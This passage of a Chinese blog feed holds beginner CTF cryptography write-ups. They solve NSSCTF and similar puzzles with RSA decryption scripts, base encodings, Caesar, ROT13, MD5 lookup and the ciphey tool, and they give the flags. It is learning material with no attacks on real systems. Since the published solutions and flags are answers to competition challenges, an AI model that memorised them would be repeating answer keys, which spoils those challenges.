getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br><br>e = <span class="hljs-number">65537</span>*<span class="hljs-number">2</span><br><br>n = p*q<br><br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p = <span class="hljs-subst">&#123;p&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;q = <span class="hljs-subst">&#123;q&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p = 9927950299160071928293508814174740578824022211226572614475267385787727188317224760986347883270504573953862618573051241506246884352854313099453586586022059</span><br><span class="hljs-string">q = 9606476151905841036013578452822151891782938033700390347379468858357928877640534612459734825681004415976431665670102068256547092636766287603818164456689343</span><br><span class="hljs-string">e = 131074</span><br><span class="hljs-string">c = 68145285629092005589126591120307889109483909395989426479108244531402455690717006058397784318664114589567149811644664654952286387794458474073250495807456996723468838094551501146672038892183058042546944692051403972876692350946611736455784779361761930869993818138259781995078436790236277196516800834433299672560</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="decrypt.py-8">decrypt.py</h3><p><strong>已知(e，p，q，c），但是e和phi不互素</strong></p><p>因为p−1或q−1都是偶数，e也是偶数，他们显然不互素。</p><p><strong>关键の公式</strong>： <span class="math display">\[c\equiv m^{e}\equiv (m^{2})^{65537}  (mod \quad n)\]</span> 把 <spanclass="math inline">\(m^{2}\)</span>看成一个整体即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">9927950299160071928293508814174740578824022211226572614475267385787727188317224760986347883270504573953862618573051241506246884352854313099453586586022059</span><br>q = <span class="hljs-number">9606476151905841036013578452822151891782938033700390347379468858357928877640534612459734825681004415976431665670102068256547092636766287603818164456689343</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">68145285629092005589126591120307889109483909395989426479108244531402455690717006058397784318664114589567149811644664654952286387794458474073250495807456996723468838094551501146672038892183058042546944692051403972876692350946611736455784779361761930869993818138259781995078436790236277196516800834433299672560</span><br><br><br>n = p*q<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = invert(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, p*q)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(isqrt(m)))<br><br><br><span class="hljs-comment"># 后面这部分也能写出下面这样：</span><br><br><br>n = p * q    <br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><span class="hljs-comment"># print(gcd(e, phi))</span><br><br>d = invert(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br>a,b = gmpy2.iroot(m,<span class="hljs-number">2</span>) <br><br><span class="hljs-built_in">print</span>(long_to_bytes(a))   <br></code></pre></td></tr></table></figure><p>2023.09.10-2023.09.14</p>]]></content>
    
    
    <categories>
      
      <category>CTF-Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
      <tag>RSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto学习总结</title>
    <link href="/2023/09/12/Crypto%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2023/09/12/Crypto%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="rsa">RSA</h2><p><code>from Crypto.Util.number import *</code><code>from gmpy2 import *</code></p><ul><li>导入两个经典的模块</li></ul><p><code>d = inverse(e, phi)</code></p><p><code>d = invert(e, phi)</code></p><ul><li><code>inverse</code>函数，<code>invert</code>函数，函数有两个参数<code>(a,p)</code>，作用便是求解<code>a</code>在模<code>p</code>意义下的乘法逆元，</li><li>这里我们便是求解<code>e</code>在模<code>phi</code>下面的乘法逆元，结果为<code>d</code></li><li>即满足$ e* d ≡ 1(modφ(n)) $</li><li>即满足$ (d * e) % phi = 1 $，%的意思是取余</li><li>这个语句使用的是 <code>Crypto.Util.number</code> 模块中的<code>inverse()</code> 函数</li></ul><p><code>d = gmpy2.invert(e, phi)</code></p><ul><li>该函数计算了一个整数 e 的模逆，也就是找到一个整数 d，使得$ (d * e) %phi = 1 $</li><li>也即是<code>d * e ≡ 1 (mod phi)</code></li><li>这个语句使用的是外部库 <code>gmpy2</code> 的 <code>invert()</code>函数来计算乘法逆元，<del>gmpy2和Crypto中的数学函数相比：二者速度不是一个量级。</del></li></ul><p><code>d = pow(e,-1,phi)</code></p><ul><li>当传递三个参数时，<code>pow(x, y, z)</code> 用于计算 <code>x</code>的 <code>y</code> 次幂模 <code>z</code> 的结果。在这里，<code>e</code>是底数，<code>-1</code> 是指数，<code>phi</code>是模数。通过将指数设置为 <code>-1</code>，<code>pow(e, -1, phi)</code>计算了 <code>e</code> 的模 <code>phi</code> 的乘法逆元。</li><li>这个语句使用的是内置函数 <code>pow()</code>来执行指数运算和模计算。</li></ul><p><code>a = powmod(a, m, n)</code></p><ul><li><code>powmod(a, m, n)</code>与<code>pow(a, m, n)</code>效果一样</li></ul><p><code>gmpy2.iroot(x, n)</code></p><ul><li>其中，<code>x</code> 是待计算根号的整数，<code>n</code>是根号类型的整数值。<code>irrot（c,e）</code>表示 对c开e次根号，</li><li>如果 <code>x</code>的根号为整数，函数将返回一个<strong>元组（tuple）</strong>，返回值为<code>(mpz(2), False)</code>，第一个参数表示返回的结果，<code>mpz</code>为<code>gmpy2</code>包中对整数的封装类，看作一个整数即可；第二个参数代表这个数是否能被完全开e次方，true表示能。</li><li>例如10开3次方并不是一个整数，但<code>gmpy2</code>只会返回取整后的整数值，故通过第二项我们能够知道是否为完全k次方数。</li><li>例如<code>iroot(9, 2)</code>返回<code>(mpz(3), True)</code>代表9是一个完全平方数。</li><li>如果想获得根号的整数值，可以通过访问元组的第一个元素来实现，例如：<ul><li><code>m1 = gmpy2.iroot(m, 2)[0]</code></li><li><code>print(long_to_bytes(m[0]))</code></li></ul></li><li>也能直接赋值的时候就赋给两个变量，这里a就是取平方根后的整数值<ul><li><code>a, b = gmpy2.iroot(m,2)</code></li></ul></li></ul><p><code>.\yafu-x64.exe "factor(@)" -batchfile 1.txt</code></p><ul><li>分解1.txt中的整数</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># 已知p,q,e之后，常规操作：</span><br><br>phi = (p-1)*(q-1)<br>d = invert(e, phi)<br>m = powmod(c, d, n)<br>print(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="快速解密">快速解密</h2><p><code>ciphey -t "4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35"</code></p><p><ahref="https://blog.csdn.net/Dome_/article/details/120689591?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169401549316800211566878%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169401549316800211566878&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120689591-null-null.142%5Ev93%5EchatgptT3_1&amp;utm_term=ciphey&amp;spm=1018.2226.3001.4187">全自动解密解码神器— Ciphey</a></p><p><ahref="https://blog.csdn.net/ntrybw/article/details/131516319?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169401549316800211566878%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169401549316800211566878&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-7-131516319-null-null.142%5Ev93%5EchatgptT3_1&amp;utm_term=ciphey&amp;spm=1018.2226.3001.4187">Windows安装ciphey编码工具，编码工具战神，cry简单题绝对克星！</a></p><hr /><hr /><p>第一个RSA，</p><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-img1694707420490.png"alt="1694707420490" /><figcaption aria-hidden="true">1694707420490</figcaption></figure><p>那就了解一下RSA是什么吧，嘻嘻😍</p><p>一个简单的介绍视频<ahref="https://www.bilibili.com/video/av73858330/?vd_source=39f0a6c7a4d98748bb31fcf1e1a3ab7f">RSA算法基本原理_哔哩哔哩_bilibili</a></p><p>简单来说就是：</p><ul><li><p>A把一个公钥(e,N)给B，B把想发给A的信息 m 用(e,N)加密成 c后发给A，A有个私钥(d,N)，用私钥解密即可，这里的 d只有A掌握，别人很难知道（涉及大整数分解问题），所以方案安全。</p></li><li><p>就是保证了信息加密是容易的，而反向解密是困难的</p></li><li><p>过程再稍微稍微详细一点就是：</p><ul><li>选两个大质数p和q，且p!=q，计算N=p*q，N就算出来了</li><li>然后计算N的欧拉函数 φ(N)=(p-1)(q-1)</li><li>然后你自己选个e， 1&lt;e&lt;φ(N)，且与φ(N)互质，</li><li>由e和φ(N)互质，(e,φ(N))=1，再由辗转相除法，则一定有ed - φ(N)k =1</li><li>那么由e就可以算出d，如下图（下图中的p1，p2就是p，q）</li><li><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-imgimage-20230915000454756.png"alt="image-20230915000454756" /><figcaption aria-hidden="true">image-20230915000454756</figcaption></figure></li><li>enmmmm，就是这样🐌</li></ul></li></ul><p>下面是视频里面的一个小实例，帮助理解</p><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-imgimage-20230915001215482.png"alt="image-20230915001215482" /><figcaption aria-hidden="true">image-20230915001215482</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-imgimage-20230915001234755.png"alt="image-20230915001234755" /><figcaption aria-hidden="true">image-20230915001234755</figcaption></figure><p>虽然有些原理还不太清楚，但学到现在这题基本就能解决了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2   <span class="hljs-comment">#一个库，就是能算很多数学运算的 </span><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5  <span class="hljs-comment">#hashlib 模块是 Python 中用于进行哈希计算的标准库模块之一。这里使用了 md5 哈希算法，这是其中的一种，通常用于生成数据的 MD5 哈希值。</span><br><br>p = <span class="hljs-number">1325465431</span><br>q = <span class="hljs-number">152317153</span><br>e = <span class="hljs-number">65537</span><br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>d = gmpy2.invert(e, phi)  <span class="hljs-comment">#非常的关键❤，该函数计算了一个整数 e 的模逆，也就是找到一个整数 d，使得 (d * e) % phi = 1 成立。%表示取余操作</span><br><br>flag = md5(<span class="hljs-built_in">str</span>(d).encode())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag is : NSSCTF&#123;%s&#125;&quot;</span>%flag.hexdigest())<br><br></code></pre></td></tr></table></figure><p>flag is : NSSCTF{08bb8fb628da85923e5734a75ac19ffe}</p><blockquote><p>数学公式里面的空格</p><p>% 意思是打出一个%符号</p><p>% 单独输入这个可以把后面的都注释掉</p><p>写数学公式换行：</p><p><span class="math inline">\(p=q\)</span>，$ p=q$，后面这个就显示错误，不能有空格</p><p>行的中间也不能有空行</p><p>[<ahref="https://blog.csdn.net/bendanban/article/details/77336206">CSDN_Markdown]数学公式对齐_markdown 数学公式对齐-CSDN博客</a></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311062156645.png"alt="image-20231106215632596" /><figcaption aria-hidden="true">image-20231106215632596</figcaption></figure></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF-Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
      <tag>RSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF-Crypto（1~15）</title>
    <link href="/2023/09/09/NSSCTF-Crypto%EF%BC%881~15%EF%BC%89/"/>
    <url>/2023/09/09/NSSCTF-Crypto%EF%BC%881~15%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>《从0开始的密码学世界生活》😋慢慢学密码方向</p><p>有两个有各种加解密的网站</p><p><a href="http://www.hiencode.com/">在线工具</a></p><p><a href="https://ctf.bugku.com/tools">Bugku CTF</a></p><h2 id="鹤城杯-2021easy_crypto">[鹤城杯 2021]easy_crypto</h2><p>解压后文件内容是社会主义核心价值观，查了一下竟然有<strong>核心价值观编码</strong>，有点逆天，那就直接用工具解码即可。</p><p>下面贴上两个网站</p><p><ahref="http://www.hiencode.com/cvencode.html">核心价值观编码-加解密1</a></p><p><ahref="https://ctf.bugku.com/tool/cvecode">核心价值观编码-加解密2</a></p><hr /><h2 id="强网拟态-2021拟态签到题">[强网拟态 2021]拟态签到题</h2><p>打开txt文件，发现看不懂，这什么东西？</p><p><a href="https://freeimage.host/i/J95ihaR"><imgsrc="https://iili.io/J95ihaR.md.png" alt="2309061" /></a></p><p>GPT一下</p><p><a href="https://freeimage.host/i/J9YVHSj"><imgsrc="https://iili.io/J9YVHSj.md.png" alt="2309062" /></a></p><p>GPT倒是一眼看出来了，base64编码，直接解码即可，仍然上面的两个网站任意一个即可</p><hr /><h2 id="swpuctf-2021-新生赛crypto8">[SWPUCTF 2021 新生赛]crypto8</h2><p>打开txt后又是一段乱码：73E-30U1&amp;&gt;V-H965S95]I&lt;U]P;W=E&lt;GT`</p><p>根据题目上面的标签提示，推测是UUencode加密</p><p>用工具解密即可</p><p>NSSCTF{cheese_is_power}</p><blockquote><p><strong>有个小问题哈，这些编码的具体实现方式我们不用具体了解吗难道🤔🤔🤔🤔🤔🤔🤔🤔🤔🤔🤔🤔，直接用工具就行了吗？</strong></p></blockquote><hr /><h2 id="swpuctf-2021-新生赛crypto7">[SWPUCTF 2021 新生赛]crypto7</h2><p>打开txt，原文如下</p><p><code>69f7906323b4f7d1e4e972acf4abfbfc,得到的结果用NSSCTF&#123;&#125;包裹。</code></p><p>根据标签，发现是MD5加密</p><p>直接解密即可，<a href="https://www.cmd5.com/">MD5解密</a></p><p>NSSCTF{md5yyds}</p><hr /><h2 id="swpuctf-2021-新生赛crypto6">[SWPUCTF 2021 新生赛]crypto6</h2><p>打开txt，原文如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">var=<span class="hljs-string">&quot;************************************&quot;</span><br>flag=<span class="hljs-string">&#x27;NSSCTF&#123;&#x27;</span> + base64<span class="hljs-selector-class">.b16encode</span>(base64<span class="hljs-selector-class">.b32encode</span>(base64<span class="hljs-selector-class">.b64encode</span>(<span class="hljs-selector-tag">var</span><span class="hljs-selector-class">.encode</span>()))) + <span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(flag)</span></span><br><br>小明不小心泄露了源码，输出结果为：<span class="hljs-number">4</span>A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D，你能还原出var的正确结果吗？<br></code></pre></td></tr></table></figure><ul><li>可以看出加密是先base64，再base32，再base16</li><li>所以解密我们就先反过来即可，16 → 32 → 64，用上面的解密网站</li><li>得到5e110989-dc43-1bd3-00b4-9009206158fe</li><li>所以flag为NSSCTF{5e110989-dc43-1bd3-00b4-9009206158fe}</li></ul><hr /><h2 id="swpuctf-2021-新生赛ez_caesar">[SWPUCTF 2021新生赛]ez_caesar</h2><p>打开后是一个.py文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">caesar</span>(<span class="hljs-params">plaintext</span>):<br>    str_list = <span class="hljs-built_in">list</span>(plaintext)<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(plaintext):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> str_list[i].isalpha():<br>            str_list[i] = str_list[i]<br>        <span class="hljs-keyword">else</span>:<br>            a = <span class="hljs-string">&quot;A&quot;</span> <span class="hljs-keyword">if</span> str_list[i].isupper() <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;a&quot;</span><br>            str_list[i] = <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(str_list[i]) - <span class="hljs-built_in">ord</span>(a) + <span class="hljs-number">5</span>) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(a) <span class="hljs-keyword">or</span> <span class="hljs-number">5</span>)<br>        i = i + <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(str_list)<br><br>flag = <span class="hljs-string">&quot;*************************&quot;</span><br><span class="hljs-built_in">str</span> = caesar(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br><br><span class="hljs-comment">#str=&quot;U1hYSFlLe2R0em1mYWpwc3RiaGZqeGZ3fQ==&quot;</span><br></code></pre></td></tr></table></figure><p>这，有点看不懂，GPT一下吧，下面是GPT的解释 &gt;这段代码首先导入了base64模块，然后定义了一个名为caesar的函数，该函数接受一个明文字符串作为输入，并返回加密后的字符串。在函数内部，首先将明文字符串转换为字符列表str_list，然后使用while循环遍历明文字符串的每个字符。在每次循环中，首先检查当前字符是否为字母。如果不是字母，则将字符保持不变。如果是字母，则根据字母的大小写确定字母表的起始位置（大写字母从'A'开始，小写字母从'a'开始），然后使用凯撒密码的规则对字母进行替换。替换的规则是将字母的Unicode码减去起始位置的Unicode码，再加上一个固定的位移量5，然后对26取模，最后再加上起始位置的Unicode码或者5。这样可以确保替换后的字符仍然是一个字母。循环结束后，将字符列表转换回字符串，并将加密后的字符串打印出来。最后一行的注释掉的代码是一个经过base64编码的字符串，你可以在需要时将其解码。</p><p>那我就懂了，嘻嘻</p><ul><li>凯撒密码（Caesar cipher），原来就是凯撒密码</li><li>最后一行注释掉的是base64编码后的结果</li><li>那我们就先base64解码，再凯撒解码应该就行</li><li>注意凯撒解码还需要一个偏移量，这里的偏移量就是5</li><li>最后得到 NSSCTF{youhaveknowcaesar}</li></ul><hr /><h2 id="swpuctf-2021-新生赛crypto10">[SWPUCTF 2021 新生赛]crypto10</h2><p>txt中的内容为：<code>AFFPGS&#123;pbatenghyngvbaf!!!&#125;,建议直接秒了</code></p><p>观察标签可以看出是个什么ROT加密，直接搜工具解密即可</p><p>NSSCTF{congratulations!!!}</p><hr /><h2 id="鹤城杯-2021a_crypto">[鹤城杯 2021]A_CRYPTO</h2><p>逆天文本：4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35</p><p>从此知道了<strong>ciphey</strong>的存在，准备配置啊啊啊啊</p><p><ahref="https://blog.csdn.net/Dome_/article/details/120689591?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169401549316800211566878%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169401549316800211566878&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120689591-null-null.142%5Ev93%5EchatgptT3_1&amp;utm_term=ciphey&amp;spm=1018.2226.3001.4187">全自动解密解码神器— Ciphey</a></p><p><ahref="https://blog.csdn.net/ntrybw/article/details/131516319?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169401549316800211566878%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169401549316800211566878&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-7-131516319-null-null.142%5Ev93%5EchatgptT3_1&amp;utm_term=ciphey&amp;spm=1018.2226.3001.4187">Windows安装ciphey编码工具，编码工具战神，cry简单题绝对克星！</a></p><p>不知道为啥，就安装成功了，但是只能在windows下的cmd中使用，等会还要在kali里面再下一个<strong>ciphey</strong></p><p>解密命令为：</p><p><code>ciphey -t "4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35"</code></p><figure><img src="https://iili.io/J9lb0js.png" alt="202309071.png" /><figcaption aria-hidden="true">202309071.png</figcaption></figure><p>所以flag为："NSSCTF{W0w_y0u_c4n_rea11y_enc0d1ng!}"</p><blockquote><p>0 0 0 下面的东西可以忽略，byd配环境配了将近一上午都没在kali里面配好，不是python版本问题就是什么PATH路径问题，到最后也没解决，草！这里由于百度网盘下载的太慢，一顿搜索后发现了其他的方法，怎么没早点发现啊😭<ahref="https://greasyfork.org/zh-CN/scripts/463707-%E5%B0%B1%E6%98%AF%E5%8A%A0%E9%80%9F-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E6%97%A0%E9%99%90%E9%80%9F%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD-%E6%94%AF%E6%8C%81%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E8%BD%BD">不多说好吧，要是有有缘人看到算是你赚了🤭</a>下面就是kali中ciphey的配置 <ahref="http://old.kali.org/virtual-images/kali-2021.2/">http://old.kali.org/virtual-images/kali-2021.2/</a><a href="https://kali.download/">https://kali.download/</a></p></blockquote><hr /><h2 id="swpuctf-2021-新生赛pigpig">[SWPUCTF 2021 新生赛]pigpig</h2><p>根据提示是一个什么猪圈密码</p><p><a href="http://www.hiencode.com/pigpen.html">在线解密即可</a></p><p>NSSCTF{whenthepigwanttoeat}</p><p>什么时候🐖想吃？🐷</p><hr /><h2 id="swpuctf-2021-新生赛ez_rsa">[SWPUCTF 2021 新生赛]ez_rsa</h2><p>打开txt内容如下，搜了一下确实是最最基础的RSA，</p><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-imgimage-20230908233108248.png"alt="image-20230908233108248" /><figcaption aria-hidden="true">image-20230908233108248</figcaption></figure><p>那就了解一下RSA是什么吧，嘻嘻😍</p><p>一个简单的介绍视频<ahref="https://www.bilibili.com/video/av73858330/?vd_source=39f0a6c7a4d98748bb31fcf1e1a3ab7f">RSA算法基本原理_哔哩哔哩_bilibili</a></p><p>简单来说就是：</p><ul><li><p>A把一个公钥(e,N)给B，B把想发给A的信息 m 用(e,N)加密成 c后发给A，A有个私钥(d,N)，用私钥解密即可，这里的 d只有A掌握，别人很难知道（涉及大整数分解问题），所以方案安全。</p></li><li><p>就是保证了信息加密是容易的，而反向解密是困难的</p></li><li><p>过程再稍微稍微详细一点就是：</p><ul><li>选两个大质数p和q，且p!=q，计算N=p*q，N就算出来了</li><li>然后计算N的欧拉函数 φ(N)=(p-1)(q-1)</li><li>然后你自己选个e， 1&lt;e&lt;φ(N)，且与φ(N)互质，</li><li>由e和φ(N)互质，(e,φ(N))=1，再由辗转相除法，则一定有ed - φ(N)k =1</li><li>那么由e就可以算出d，如下图（下图中的p1，p2就是p，q）</li><li><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-imgimage-20230908235228225.png"alt="image-20230908235228225" /><figcaption aria-hidden="true">image-20230908235228225</figcaption></figure></li><li>enmmmm，就是这样🐌</li></ul></li></ul><p>下面是视频里面的一个小实例，帮助理解</p><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-imgimage-20230908233527952.png"alt="image-20230908233527952" /><figcaption aria-hidden="true">image-20230908233527952</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-imgimage-20230908234751944.png"alt="image-20230908234751944" /><figcaption aria-hidden="true">image-20230908234751944</figcaption></figure><p>虽然有些原理还不太清楚，但学到现在这题基本就能解决了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2   <span class="hljs-comment">#一个库，就是能算很多数学运算的 </span><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5  <span class="hljs-comment">#hashlib 模块是 Python 中用于进行哈希计算的标准库模块之一。这里使用了 md5 哈希算法，这是其中的一种，通常用于生成数据的 MD5 哈希值。</span><br><br>p = <span class="hljs-number">1325465431</span><br>q = <span class="hljs-number">152317153</span><br>e = <span class="hljs-number">65537</span><br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>d = gmpy2.invert(e, phi)  <span class="hljs-comment">#非常的关键❤，该函数计算了一个整数 e 的模逆，也就是找到一个整数 d，使得 (d * e) % phi = 1 成立。%表示取余操作</span><br><br>flag = md5(<span class="hljs-built_in">str</span>(d).encode())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag is : NSSCTF&#123;%s&#125;&quot;</span>%flag.hexdigest())<br><br></code></pre></td></tr></table></figure><p>flag is : NSSCTF{08bb8fb628da85923e5734a75ac19ffe}</p><hr /><h2 id="bjdctf-2020base">[BJDCTF 2020]base??</h2><p>打开后是这串东西</p><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-imgimage-20230909003141021.png"alt="image-20230909003141021" /><figcaption aria-hidden="true">image-20230909003141021</figcaption></figure><p>直接赛博厨子解决了😂，相当于换表操作，查了一下，写python代码还有点复杂🤔，等会再看一下（</p><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-imgimage-20230909005020849.png"alt="image-20230909005020849" /><figcaption aria-hidden="true">image-20230909005020849</figcaption></figure><hr /><h2 id="swpuctf-2021-新生赛traditional">[SWPUCTF 2021新生赛]traditional</h2><p>打开后是个什么东西，不懂，明天再看吧，byd已经1点力，还没刷牙😭</p><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-imgimage-20230909010611371.png"alt="image-20230909010611371" /><figcaption aria-hidden="true">image-20230909010611371</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>CTF-Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
      <tag>NSSCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>求解1²+2²+3²+……+n²</title>
    <link href="/2023/09/05/%E6%B1%82%E8%A7%A31%C2%B2+2%C2%B2+3%C2%B2+%E2%80%A6%E2%80%A6+n%C2%B2/"/>
    <url>/2023/09/05/%E6%B1%82%E8%A7%A31%C2%B2+2%C2%B2+3%C2%B2+%E2%80%A6%E2%80%A6+n%C2%B2/</url>
    
